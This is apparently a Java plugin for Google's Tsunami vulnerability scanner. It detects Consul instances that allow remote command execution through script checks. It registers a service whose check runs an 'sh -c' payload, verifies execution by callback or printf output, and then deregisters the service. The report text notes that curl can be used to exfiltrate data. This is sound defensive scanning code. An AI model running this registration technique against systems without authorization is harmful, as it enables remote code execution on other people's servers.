/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.consul;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForServiceName;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** Detects Consul enable script checks RCE */
@ForWebService
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ConsulEnableScriptChecksCommandExecutionDetector",
    version = "0.1",
    description = "Detects Consul enable script checks RCE",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = ConsulEnableScriptChecksCommandExecutionDetectorBootstrapModule.class)

// nmap returns fmtp for the Consul admin endpoint
@ForServiceName({"fmtp"})
public final class ConsulEnableScriptChecksCommandExecutionDetector implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "Google";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_ID = "CONSUL_ENABLE_SCRIPT_CHECKS_COMMAND_EXECUTION";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Consul -enable-script-checks remote command execution";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION =
      "The scanner detected that attackers can execute arbitrary code on this server as Consul is"
          + " configured with -enable-script-checks set to true while the Consul HTTP API is"
          + " unsecured and accessible over the network. In versions of Consul 0.9.0 or earlier,"
          + " script checks are by default on, while in later versions, they are disabled by"
          + " default. See"
          + " https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations"
          + " for more information.\n"
          + "Details on the scanner logic:\n"
          + " The scanner was able to register a service on the Consul instance using the"
          + " /v1/health/service REST endpoint which executed one of the following: \n"
          + "1. A `curl` command to a remote server outside of the network, a technique that can be"
          + " used to exfiltrate data from the server.\n"
          + "2. A `printf` command whose output was then verified by using the /v1/health/service"
          + " REST endpoint.\n"
          + " Note that that the scanner subsequently cleaned up and deregistered the service using"
          + " the /v1/agent/service/deregister/ REST endpoint.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Upgrade to a more modern Consul version, enable ACLs, and disable script checks. If your"
          + " require script checks, use the -enable-local-script-checks flag instead. For ACL"
          + " configuration, see https://www.consul.io/docs/security/acl#acl-documentation and"
          + " https://learn.hashicorp.com/tutorials/consul/access-control-setup-production#bootstrapping-acls";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String RCE_TEST_SERVICE_NAME = "TSUNAMI_RCE_TEST";
  private static final String RCE_VULNERABILITY_PATH = "/v1/agent/service/register";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final String payloadFormatString;

  @Inject
  ConsulEnableScriptChecksCommandExecutionDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator)
      throws IOException {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.payloadFormatString =
        String.format(
            Resources.toString(
                Resources.getResource(this.getClass(), "payloadFormatString.json"), UTF_8),
            RCE_TEST_SERVICE_NAME,
            "%s"); // Keep the second placeholder for the command payload later
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Start detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    boolean hasRegiseredService = false;

    String rootUri = toUriAuthority(networkService.getNetworkEndpoint());

    String targetUri =
        String.format("http://%s%s?replace-existing-checks=true", rootUri, RCE_VULNERABILITY_PATH);

    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = this.payloadGenerator.generate(config);
    // Don't include start and ending " because they are already in payloadFormatString
    String rceCommand = String.format("sh\", \"-c\", \"%s", payload.getPayload());
    String reqPayload = String.format(payloadFormatString, rceCommand);

    try {
      HttpRequest req =
          HttpRequest.put(targetUri)
              .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
              .setRequestBody(ByteString.copyFromUtf8(reqPayload))
              .build();

      HttpResponse res = this.httpClient.send(req, networkService);

      hasRegiseredService = res.status().isSuccess();

    } catch (IOException e) {
      logger.atWarning().withCause(e).log(
          "Fail to exploit '%s'. Maybe it is not vulnerable", targetUri);
      return false;
    }

    if (!hasRegiseredService) {
      return false;
    }

    boolean isVulnerable = false;

    try {
      // If there is an RCE, the execution isn't immediate.
      Thread.sleep(10000);

      if (payload.getPayloadAttributes().getUsesCallbackServer()) {
        logger.atInfo().log("TCS enabled, so checking vulnerability using it.");

        isVulnerable = payload.checkIfExecuted();

      } else {
        logger.atInfo().log("TCS not enabled, so trying alternative method.");

        String verificationUri =
            String.format("http://%s/v1/health/service/%s", rootUri, RCE_TEST_SERVICE_NAME);

        HttpRequest req = HttpRequest.get(verificationUri).withEmptyHeaders().build();

        try {
          HttpResponse res = this.httpClient.send(req, networkService);
          isVulnerable = res.status().isSuccess() && payload.checkIfExecuted(res.bodyBytes());

        } catch (IOException e) {
          logger.atWarning().withCause(e).log("Failed to validate RCE against %s", verificationUri);
          isVulnerable = false;
        }
      }
    } catch (InterruptedException e) {
      logger.atWarning().withCause(e).log("Failed to wait for RCE result");
      isVulnerable = false;
    }

    this.cleanUp(rootUri, networkService);

    return isVulnerable;
  }

  /** Unregisters the registered service */
  private void cleanUp(String rootUri, NetworkService networkService) {
    logger.atInfo().log("Cleaning up registered service");

    String unregisterUri =
        String.format("http://%s/v1/agent/service/deregister/%s", rootUri, RCE_TEST_SERVICE_NAME);

    HttpRequest req = HttpRequest.put(unregisterUri).withEmptyHeaders().build();

    try {
      HttpResponse res = this.httpClient.send(req, networkService);

      if (res.status().isSuccess()) {
        logger.atInfo().log(
            "Successfully unregistered %s from Consul instance", RCE_TEST_SERVICE_NAME);
      } else {
        logger.atWarning().log(
            "Failed to remove %s from Consul instance, response status %s",
            RCE_TEST_SERVICE_NAME, res.status());
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log(
          "Failed to remove %s from Consul instance with exception %s",
          RCE_TEST_SERVICE_NAME, e.getMessage());
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION))
        .build();
  }
}
